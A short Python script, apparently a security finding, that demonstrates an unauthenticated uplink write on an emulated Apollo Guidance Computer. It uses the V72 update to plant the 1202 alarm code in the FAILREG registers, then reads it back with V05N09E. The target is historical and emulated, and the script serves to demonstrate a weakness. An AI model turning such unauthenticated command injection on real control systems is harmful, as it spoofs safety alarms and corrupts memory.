"""Finding 2: arbitrary erasable write over an unauthenticated uplink.

Target: FAILREG (ECADR 0375), the three alarm-code registers.

We write 01202 into FAILREG from the ground, then use the AGC's own
alarm-readout procedure (V05N09E) to display it -- the same keystrokes
the crew used on 20 July 1969.  The executive is never loaded; no core
sets are exhausted; nothing actually went wrong.
"""
import sys, os
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
BOOT_SETTLE = 10.0   # AGC fresh start must complete before it accepts input
from agc_link import AGC
from p27 import v72_write, verb, noun

FAILREG = 0o0375

agc = AGC()
agc.pump(BOOT_SETTLE)

print("=== 1. put the CMC in P00 (P27 only accepts updates there) ===")
verb(agc, 37)
from p27 import load
load(agc, 0)          # program 00
agc.pump(1.5)
print(agc.render())

print("\n=== 2. read alarm registers BEFORE (V05N09E) ===")
verb(agc, 5)
noun(agc, 9)
agc.pump(1.5)
print(agc.render())

print("\n=== 3. uplink a V72 scatter update targeting FAILREG ===")
v72_write(agc, [(FAILREG, 0o1202)])
agc.pump(2.0)

print("\n=== 4. read alarm registers AFTER (V05N09E) ===")
verb(agc, 5)
noun(agc, 9)
agc.pump(2.0)
print(agc.render())
